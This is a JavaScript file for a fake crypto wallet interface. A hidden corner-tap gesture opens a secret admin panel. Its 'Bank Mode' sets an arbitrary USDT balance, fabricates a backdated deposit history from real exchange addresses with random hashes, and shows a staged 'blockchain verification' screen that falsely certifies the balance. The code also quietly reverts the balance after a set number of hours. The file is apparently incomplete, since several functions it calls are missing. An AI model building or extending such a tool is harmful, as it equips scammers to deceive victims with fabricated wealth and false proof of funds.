// DOM Elements
const splashScreen = document.getElementById('splash-screen');
const passcodeScreen = document.getElementById('passcode-screen');
const walletScreen = document.getElementById('wallet-screen');
const tokenDetailScreen = document.getElementById('token-detail-screen');
const loadingOverlay = document.querySelector('.loading-overlay');
const transferModal = document.getElementById('transfer-modal');
const adminPanel = document.getElementById('admin-panel');

// Passcode Screen Elements
const passcodeKeys = document.querySelectorAll('.passcode-key');
const passcodeDots = document.querySelectorAll('.passcode-dot');
const passcodeBiometric = document.querySelector('.passcode-key.biometric');
const passcodeBackspace = document.querySelector('.passcode-key.backspace');
const passcodeCancel = document.querySelector('.passcode-cancel');

// Wallet Screen Elements
const tokens = document.querySelectorAll('.token-item');
const usdtToken = document.getElementById('usdt-token');
const tabItems = document.querySelectorAll('.tab-item');
const sendButton = document.querySelector('.wallet-action-button:nth-child(1)');

// Token Detail Screen Elements
const backButton = document.querySelector('.back-button');
const chartTabs = document.querySelectorAll('.chart-tab');
const tokenSendButton = document.querySelector('.button-send');
const receiveButton = document.querySelector('.button-receive');

// Transfer Modal Elements
const walletAddressInput = document.getElementById('wallet-address');
const walletDropdown = document.getElementById('wallet-dropdown');
const walletOptions = document.querySelectorAll('.wallet-option');
const transferAmountInput = document.getElementById('transfer-amount');
const cancelTransferButton = document.getElementById('cancel-transfer');
const confirmTransferButton = document.getElementById('confirm-transfer');

// Admin Panel Elements
const adminUsdtBalance = document.getElementById('admin-usdt-balance');
const fakeHistoryToggle = document.getElementById('fake-history-toggle');
const interceptToggle = document.getElementById('intercept-toggle');
const adminRevertTime = document.getElementById('admin-revert-time');
const adminActivate = document.getElementById('admin-activate');
const adminCancel = document.getElementById('admin-cancel');

// Global Variables
let passcode = '';
const correctPasscode = '123456'; // For demo purposes
let currentAccount = 'main'; // main or second
let currentWalletAddress = '0x1234...6789'; // Your wallet
let alternateWalletAddress = '';
let adminModeActive = false;
let gestureSequence = [];
let gestureTimeout;
let originalBalances = {}; // Store original balances before admin mode

// Show loading overlay
function showLoading() {
    loadingOverlay.style.display = 'flex';
}

// Hide loading overlay
function hideLoading() {
    loadingOverlay.style.display = 'none';
}

// Format number with commas
function formatNumber(num) {
    return num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
}

// Format currency
function formatCurrency(num) {
    return '$' + formatNumber(num.toFixed(2));
}

// Update the time in the status bar
function updateTime() {
    const now = new Date();
    let hours = now.getHours();
    let minutes = now.getMinutes();
    hours = hours < 10 ? '0' + hours : hours;
    minutes = minutes < 10 ? '0' + minutes : minutes;
    const timeString = hours + ':' + minutes;
    document.querySelector('.status-time').textContent = timeString;
}

// Process passcode input
function processPasscode(key) {
    if (passcode.length < 6) {
        passcode += key;
        passcodeDots[passcode.length - 1].classList.add('filled');
        
        if (passcode.length === 6) {
            // Check if passcode is correct (for demo, any 6-digit code works)
            setTimeout(() => {
                showLoading();
                setTimeout(() => {
                    passcodeScreen.style.display = 'none';
                    walletScreen.style.display = 'flex';
                    hideLoading();
                    
                    // Initialize wallet display
                    updateWalletDisplay();
                    updateTransactionHistory();
                }, 1000);
            }, 300);
        }
    }
}

// Backspace passcode
function backspacePasscode() {
    if (passcode.length > 0) {
        passcode = passcode.substring(0, passcode.length - 1);
        passcodeDots[passcode.length].classList.remove('filled');
    }
}

// Reset passcode
function resetPasscode() {
    passcode = '';
    passcodeDots.forEach(dot => dot.classList.remove('filled'));
}

// Set active tab in wallet screen
function setActiveTab(index) {
    tabItems.forEach(tab => tab.classList.remove('active'));
    tabItems[index].classList.add('active');
}

// Set active chart period in token detail
function setActiveChartPeriod(element) {
    chartTabs.forEach(tab => tab.classList.remove('active'));
    element.classList.add('active');
}

// Show toast message
function showToast(message) {
    const toast = document.createElement('div');
    toast.style.position = 'fixed';
    toast.style.bottom = '80px';
    toast.style.left = '50%';
    toast.style.transform = 'translateX(-50%)';
    toast.style.backgroundColor = 'rgba(0, 0, 0, 0.7)';
    toast.style.color = 'white';
    toast.style.padding = '10px 20px';
    toast.style.borderRadius = '20px';
    toast.style.zIndex = '1000';
    toast.textContent = message;
    document.body.appendChild(toast);
    
    setTimeout(() => {
        toast.style.opacity = '0';
        toast.style.transition = 'opacity 0.5s';
        setTimeout(() => {
            document.body.removeChild(toast);
        }, 500);
    }, 2000);
}

// Show transfer modal
function showTransferModal() {
    transferModal.style.display = 'flex';
    walletAddressInput.value = '';
    transferAmountInput.value = '';
}

// Hide transfer modal
function hideTransferModal() {
    transferModal.style.display = 'none';
}

// Toggle wallet dropdown
function toggleWalletDropdown() {
    const isVisible = walletDropdown.style.display === 'block';
    walletDropdown.style.display = isVisible ? 'none' : 'block';
}

// Show admin panel
function showAdminPanel() {
    adminPanel.classList.remove('hidden');
}

// Hide admin panel
function hideAdminPanel() {
    adminPanel.classList.add('hidden');
}

// Process secret gesture sequence
function processGesture(position) {
    // Add the position to the gesture sequence
    gestureSequence.push(position);
    
    // Clear the timeout if it exists
    if (gestureTimeout) {
        clearTimeout(gestureTimeout);
    }
    
    // Set a timeout to clear the gesture sequence if no input for 3 seconds
    gestureTimeout = setTimeout(() => {
        gestureSequence = [];
    }, 3000);
    
    // Check if the correct sequence has been entered
    // The secret sequence is: top-left, top-right, top-left, bottom-left
    if (gestureSequence.length === 4 &&
        gestureSequence[0] === 'top-left' &&
        gestureSequence[1] === 'top-right' &&
        gestureSequence[2] === 'top-left' &&
        gestureSequence[3] === 'bottom-left') {
        
        // Show admin panel
        showAdminPanel();
        
        // Reset the gesture sequence
        gestureSequence = [];
    }
}

// Show verification overlay
function showVerificationOverlay() {
    const overlay = document.createElement('div');
    overlay.className = 'verification-overlay';
    
    const content = document.createElement('div');
    content.className = 'verification-content';
    
    content.innerHTML = `
        <img class="verification-icon" src="https://img.icons8.com/ios-filled/100/0B65C6/data-protection.png" alt="Verification">
        <div class="verification-title">Balance Verification</div>
        <div class="verification-message">Securely verifying your wallet balance with blockchain network...</div>
        <div class="verification-spinner"></div>
        <div class="verification-badge">Secure Blockchain Verification</div>
    `;
    
    overlay.appendChild(content);
    document.body.appendChild(overlay);
    
    overlay.style.display = 'flex';
    
    // Simulate verification process
    setTimeout(() => {
        content.innerHTML = `
            <img class="verification-icon" src="https://img.icons8.com/ios-filled/100/00B05B/checkmark--v1.png" alt="Verified">
            <div class="verification-title">Balance Verified</div>
            <div class="verification-message">Your balance has been successfully verified and certified on the blockchain network.</div>
            <div class="certificate-badge">Verification ID: 5F39-2E7A-B104</div>
            <div class="verification-date">Verified on ${new Date().toLocaleString()}</div>
        `;
        
        setTimeout(() => {
            document.body.removeChild(overlay);
        }, 3000);
    }, 2500);
}

// Activate bank mode
function activateBankMode() {
    const newBalance = parseFloat(adminUsdtBalance.value);
    
    if (isNaN(newBalance) || newBalance <= 0) {
        showToast('Please enter a valid balance');
        return;
    }
    
    // Store original balance if not already stored
    if (!originalBalances[currentAccount]) {
        originalBalances[currentAccount] = {
            USDT: walletBalances[currentAccount].USDT,
            BTC: walletBalances[currentAccount].BTC,
            ETH: walletBalances[currentAccount].ETH,
            XRP: walletBalances[currentAccount].XRP,
            BNB: walletBalances[currentAccount].BNB
        };
    }
    
    // Update USDT balance
    walletBalances[currentAccount].USDT = newBalance;
    
    // Update display
    updateWalletDisplay();
    
    // Generate fake transaction history if selected
    if (fakeHistoryToggle.checked) {
        generateFakeTransactions(newBalance);
    }
    
    // Hide admin panel
    hideAdminPanel();
    
    // Show success message
    showToast('Bank Mode Activated');
    
    // Set admin mode active
    adminModeActive = true;
    
    // Set expiration timer
    const revertTime = parseInt(adminRevertTime.value);
    if (!isNaN(revertTime) && revertTime > 0) {
        setTimeout(() => {
            // Reset to original balance
            walletBalances[currentAccount].USDT = originalBalances[currentAccount].USDT;
            updateWalletDisplay();
            updateTransactionHistory();
            adminModeActive = false;
            showToast('Balance has been reset');
        }, revertTime * 3600000); // Convert hours to milliseconds
    }
}

// Generate realistic fake transactions
function generateFakeTransactions(targetAmount) {
    // Clear existing transaction history
    transactionHistory = [];
    
    // Calculate how many transactions we need
    const txCount = Math.min(20, Math.max(5, Math.floor(targetAmount / 1000000)));
    let remainingAmount = targetAmount;
    
    // Generate deposits from exchanges
    const exchanges = [
        { name: 'Binance', address: '0x28C6c06298d514Db089934071355E5743bf21d60' },
        { name: 'Coinbase', address: '0x71660c4005BA85c37ccec55d0C4493E66Fe775d3' },
        { name: 'Kraken', address: '0x43A9f8345E2d74f76276c35384c4aa32559f9ad4' },
        { name: 'Crypto.com', address: '0x6Cc5F688a315f3dC28A7781717a9A798a59fDA7b' },
        { name: 'FTX', address: '0x2FAF487A4414Fe77e2327F0bf4AE2a264a776AD2' }
    ];
    
    // Create dates spread over last 6 months
    const now = new Date();
    const sixMonthsAgo = new Date();
    sixMonthsAgo.setMonth(now.getMonth() - 6);
    
    for (let i = 0; i < txCount; i++) {
        // Randomize transaction size, larger ones for early transactions
        let txPercentage;
        if (i < txCount * 0.3) {
            // First 30% of transactions are larger
            txPercentage = 0.1 + (Math.random() * 0.2); // 10-30% of remaining
        } else {
            // Remaining 70% are smaller
            txPercentage = 0.02 + (Math.random() * 0.08); // 2-10% of remaining
        }
        
        const txAmount = remainingAmount * txPercentage;
        remainingAmount -= txAmount;
        
        // Randomize transaction date
        const txDate = new Date(
            sixMonthsAgo.getTime() + 
            Math.random() * (now.getTime() - sixMonthsAgo.getTime())
        );
        
        const formatDate = `${txDate.toLocaleString('default', { month: 'short' })} ${txDate.getDate()}, ${txDate.getFullYear()}`;
        
        // Select a random exchange
        const exchange = exchanges[Math.floor(Math.random() * exchanges.length)];
        
        // Add to transaction history
        transactionHistory.push({
            from: exchange.address,
            to: currentAccount,
            token: 'USDT',
            amount: txAmount,
            date: formatDate,
            type: 'receive',
            hash: generateTxHash()
        });
    }
    
    // Sort by date (newest first)
    transactionHistory.sort((a, b) => {
        return new Date(b.date) - new Date(a.date);
    });
    
    // Update transaction history display
    updateTransactionHistory();
}

// Generate transaction hash
function generateTxHash() {
    const chars = '0123456789abcdef';
    let hash = '0x';
    
    for (let i = 0; i < 64; i++) {
        hash += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    
    return hash;
}

// Add hidden gesture trigger areas
function addGestureTriggers() {
    const positions = ['top-left', 'top-right', 'bottom-left'];
    
    positions.forEach(position => {
        const trigger = document.createElement('div');
        trigger.className = `gesture-trigger ${position}`;
        
        trigger.addEventListener('click', () => {
            processGesture(position);
        });
        
        document.body.appendChild(trigger);
    });
}

// Initialize app
function initApp() {
    updateTime();
    
    // Update time every minute
    setInterval(updateTime, 60000);
    
    // Initialize transfer options
    updateTransferOptions();
    
    // Simulate splash screen for 1.5 seconds
    setTimeout(() => {
        splashScreen.style.opacity = 0;
        setTimeout(() => {
            splashScreen.style.display = 'none';
            
            // For demo, we'll skip passcode and go directly to wallet
            // In a real app, you'd show the passcode screen instead
            // passcodeScreen.style.display = 'flex';
            walletScreen.style.display = 'flex';
            
            // Initialize wallet display
            updateWalletDisplay();
            updateTransactionHistory();
        }, 500);
    }, 1500);
    
    // Add hidden gesture triggers for admin mode
    addGestureTriggers();
    
    // Add admin panel event listeners
    adminActivate.addEventListener('click', activateBankMode);
    adminCancel.addEventListener('click', hideAdminPanel);
    
    // Event listeners setup
    setupEventListeners();
    setupTouchEffects();
}

// Setup touch ripple effect
function setupTouchEffects() {
    const rippleButtons = document.querySelectorAll('.touch-effect');
    rippleButtons.forEach(button => {
        button.addEventListener('click', function(e) {
            const rect = this.getBoundingClientRect();
            const x = e.clientX - rect.left;
            const y = e.clientY - rect.top;
            
            const circle = document.createElement('div');
            circle.style.position = 'absolute';
            circle.style.borderRadius = '50%';
            circle.style.width = '100px';
            circle.style.height = '100px';
            circle.style.top = y - 50 + 'px';
            circle.style.left = x - 50 + 'px';
            circle.style.backgroundColor = 'rgba(255, 255, 255, 0.3)';
            circle.style.transform = 'scale(0)';
            circle.style.transition = 'transform 0.5s, opacity 0.5s';
            
            this.appendChild(circle);
            
            setTimeout(() => {
                circle.style.transform = 'scale(1)';
                circle.style.opacity = '0';
                setTimeout(() => {
                    if (circle.parentNode) {
                        circle.parentNode.removeChild(circle);
                    }
                }, 500);
            }, 10);
        });
    });
}

// Setup event listeners
function setupEventListeners() {
    // Passcode keys
    passcodeKeys.forEach(key => {
        if (!key.classList.contains('biometric') && !key.classList.contains('backspace')) {
            key.addEventListener('click', () => {
                processPasscode(key.textContent);
            });
        }
    });
    
    // Biometric button
    passcodeBiometric.addEventListener('click', () => {
        // Simulate biometric authentication
        showLoading();
        setTimeout(() => {
            passcodeScreen.style.display = 'none';
            walletScreen.style.display = 'flex';
            hideLoading();
            
            // Initialize wallet display
            updateWalletDisplay();
            updateTransactionHistory();
        }, 1000);
    });
    
    // Backspace button
    passcodeBackspace.addEventListener('click', backspacePasscode);
    
    // Cancel button
    passcodeCancel.addEventListener('click', resetPasscode);
    
    // USDT token click
    usdtToken.addEventListener('click', () => {
        showLoading();
        setTimeout(() => {
            walletScreen.style.display = 'none';
            tokenDetailScreen.style.display = 'flex';
            updateTransactionHistory();
            hideLoading();
        }, 500);
    });
    
    // Back button in token detail
    backButton.addEventListener('click', () => {
        tokenDetailScreen.style.display = 'none';
        walletScreen.style.display = 'flex';
    });
    
    // Send button in wallet
    sendButton.addEventListener('click', showTransferModal);
    
    // Send button in token detail
    tokenSendButton.addEventListener('click', showTransferModal);
    
    // Tab bar items
    tabItems.forEach((tab, index) => {
        tab.addEventListener('click', () => {
            if (index === 0) {
                setActiveTab(index);
            } else {
                showToast('Feature not available in demo');
            }
        });
    });
    
    // Chart period tabs
    chartTabs.forEach(tab => {
        tab.addEventListener('click', () => {
            setActiveChartPeriod(tab);
        });
    });
    
    // Receive button
    receiveButton.addEventListener('click', () => {
        showToast('Receive feature not available in demo');
    });
    
    // Network selector
    document.querySelector('.network-selector').addEventListener('click', () => {
        showToast('Network selector not available in demo');
    });
    
    // Settings button
    document.querySelector('.wallet-settings').addEventListener('click', () => {
        showToast('Settings not available in demo');
    });
    
    // Scan button
    document.querySelector('.wallet-scan').addEventListener('click', () => {
        showToast('Scan feature not available in demo');
    });
    
    // Wallet address input click
    walletAddressInput.addEventListener('click', toggleWalletDropdown);
    
    // Wallet option selection
    walletOptions.forEach(option => {
        option.addEventListener('click', () => {
            walletAddressInput.value = option.dataset.address;
            walletDropdown.style.display = 'none';
        });
    });
    
    // Cancel transfer
    cancelTransferButton.addEventListener('click', hideTransferModal);
    
    // Confirm transfer
    confirmTransferButton.addEventListener('click', processTransfer);
    
    // Wallet title click
    document.querySelector('.wallet-title').addEventListener('click', toggleAccountsDropdown);
    
    // Account options
    document.querySelectorAll('.account-option').forEach(option => {
        option.addEventListener('click', () => {
            switchAccount(option.dataset.account);
        });
    });
    
    // Long press on wallet balance to show verification
    document.querySelector('.wallet-total-balance').addEventListener('click', () => {
        if (adminModeActive && interceptToggle.checked) {
            showVerificationOverlay();
        }
    });
    
    // Add support for keyboard input for passcode (for desktop testing)
    document.addEventListener('keydown', (e) => {
        if (passcodeScreen.style.display === 'flex') {
            if (e.key >= '0' && e.key <= '9') {
                processPasscode(e.key);
            } else if (e.key === 'Backspace') {
                backspacePasscode();
            } else if (e.key === 'Escape') {
                resetPasscode();
            } else if (e.key === 'Enter') {
                // Simulate biometric authentication
                if (passcode.length === 0) {
                    passcodeBiometric.click();
                }
            }
        }
    });
}

// Initialize app when DOM is fully loaded
document.addEventListener('DOMContentLoaded', initApp);
